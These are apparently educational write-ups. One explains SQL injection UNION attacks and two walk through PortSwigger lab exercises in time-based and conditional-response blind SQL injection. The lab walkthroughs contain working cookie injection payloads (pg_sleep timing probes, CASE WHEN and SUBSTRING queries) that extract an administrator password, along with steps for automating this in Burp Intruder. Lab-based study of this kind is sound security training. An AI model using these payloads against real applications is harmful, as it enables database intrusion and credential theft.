<h1><strong>SQL Injection UNION Attacks</strong></h1>
Overview

A SQL Injection UNION attack occurs when an application is vulnerable to SQL injection and returns database query results in its response. In this situation, an attacker can use the SQL UNION operator to combine the results of the original query with additional queries in order to retrieve data from other tables within the database.

This technique allows attackers to extract sensitive information such as user credentials, database metadata, or other confidential records.

How the UNION Operator Works

The SQL UNION keyword is used to combine the results of multiple SELECT queries into a single result set.

Example:

SELECT a, b FROM table1
UNION
SELECT c, d FROM table2;

The query returns a single result containing:

values from columns a and b in table1

values from columns c and d in table2

Requirements for a Successful UNION Attack

For a UNION-based SQL injection to function correctly, two key conditions must be satisfied:

Equal Number of Columns
Each query involved in the UNION statement must return the same number of columns.

Compatible Data Types
The corresponding columns in each query must have compatible data types so that the database can merge the results.

<h3><strong>Attack Principle</strong></h3>

When exploiting a vulnerable application, an attacker injects a UNION SELECT statement into an input field. This allows the attacker to append a malicious query to the original SQL query executed by the application.

If the application displays the database results on the webpage, the attacker can retrieve and view data from other database tables.

<h3><strong>Security Impact</strong></h3>

A successful UNION SQL injection attack can expose:

usernames and passwords

database structure information

sensitive user data

administrative records

<h3><strong>Prevention</strong></h3>

To mitigate UNION-based SQL injection attacks, developers should implement secure coding practices such as:

Prepared statements (parameterized queries)

Input validation and sanitization

Least privilege database access

Proper error handling to avoid exposing database errors

<h3><strong>Conclusion</strong></h3>

SQL Injection UNION attacks exploit improper input handling in web applications. Understanding how these attacks work is essential for cybersecurity professionals and developers in order to detect vulnerabilities and implement effective defensive measures.


<h1><strong>🛡️ Blind SQL Injection with Time Delays</strong></h1>
📌 Overview

This project demonstrates how to exploit a time-based blind SQL injection vulnerability. Unlike traditional SQL injection, no data is directly returned in the response. Instead, we rely on response time delays to infer information from the database.

<h3><strong>🔍 What is Blind SQL Injection?</strong></h3>

Blind SQL injection occurs when:

The application does not return query results

No visible errors are shown

Attackers must rely on indirect responses (e.g., time delays)

🧠 Key Idea

True condition → delayed response

False condition → normal response

<h3><strong>⚙️ Lab Scenario</strong></h3>

<img width="1901" height="941" alt="BLIND SQL INJECTION CLASS" src="https://github.com/user-attachments/assets/67d20bed-9102-45af-8a84-6fe379f48fe0" />


The vulnerability exists in a cookie parameter:

TrackingId=xyz
🧪 Test Payload
TrackingId=xyz'||pg_sleep(10)--
✅ Result

Server delays response by 10 seconds

Confirms SQL injection vulnerability

🚀 Exploitation Steps
1. Confirm Injection
TrackingId=xyz'||pg_sleep(10)--

If response is delayed → injection is successful

2. Test Boolean Conditions
TrackingId=xyz'||CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

Delay = condition is true

No delay = condition is false

3. Extract Data (Character by Character)

Example:

TrackingId=xyz'||CASE 
WHEN (SUBSTRING(password,1,1)='a') 
THEN pg_sleep(10) 
ELSE pg_sleep(0) 
END--

Tests if the first character of the password is 'a'

Repeat for all positions and characters

4. Automate the Attack (Optional)

Use tools like:

Burp Suite Intruder (Cluster Bomb attack)

To:

Iterate over positions

Test multiple characters automatically

Speed up password extraction

🛠️ Tools Used

Burp Suite (Proxy, Repeater, Intruder)

Web browser

Vulnerable lab environment

🛡️ Key Takeaways

Blind SQL injection uses timing-based inference

Functions like:

pg_sleep() (PostgreSQL)

SLEEP() (MySQL)

Even without visible output, sensitive data can still be extracted

🎯 Outcome

By exploiting time delays and testing conditions:

The administrator password was successfully retrieved

The lab was completed


<h1><strong>🛡️ Blind SQL Injection with Conditional Responses</strong></h1>
📌 Overview

This project demonstrates how to exploit a blind SQL injection vulnerability using conditional responses. Instead of relying on time delays, this technique uses differences in application responses (e.g., “Welcome back”) to extract sensitive data.

🔍 Concept

In blind SQL injection with conditional responses:

The application does not return database errors or data

Instead, it behaves differently based on a condition

🧠 Key Idea

True condition → “Welcome back” appears

False condition → No message / different response

This allows attackers to extract data one character at a time.

<h3><strong>⚙️ Lab Scenario (from PortSwigger Web Security Academy)</strong></h3>

<img width="1905" height="1027" alt="blind SQL LAB ASSIGNMENT" src="https://github.com/user-attachments/assets/4d97a538-7bca-44b0-9a26-3d44776a1754" />


Target: Cookie parameter (TrackingId)

Goal: Extract the administrator password

Tool used: Burp Suite Intruder (Cluster Bomb attack)

🚀 Exploitation Steps
1. Confirm Injection Point

Inject into cookie:

TrackingId=xyz' AND '1'='1

Then test:

TrackingId=xyz' AND '1'='2

Difference in response confirms vulnerability

2. Detect Valid Username
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

If “Welcome back” appears → user exists

3. Extract Password Length
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>1--

Increase number until condition becomes false

4. Extract Password (Character by Character)

Example:

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--

Loop through:

Positions (1, 2, 3…)

Characters (a–z, 0–9)

⚡ Automation with Burp Suite Intruder
Attack Type: Cluster Bomb

From the image:

Payload 1 → Position of character

Payload 2 → Character set (a–z, 0–9)

🎯 Detection Method

Use Grep Match:

Welcome back

Correct guesses return this phrase

📊 Result

Matching responses identify correct characters

Password is reconstructed step-by-step

🛠️ Tools Used

Burp Suite Professional

Proxy

Repeater

Intruder (Cluster Bomb)

Web browser

🛡️ Key Takeaways

Blind SQL injection can work without:

Errors

Visible output

Conditional responses are as powerful as time delays

Automation tools significantly speed up attacks

Poor input validation leads to full data exposure

🎯 Outcome

Successfully extracted the administrator password

Logged into the account

Lab marked as Solved
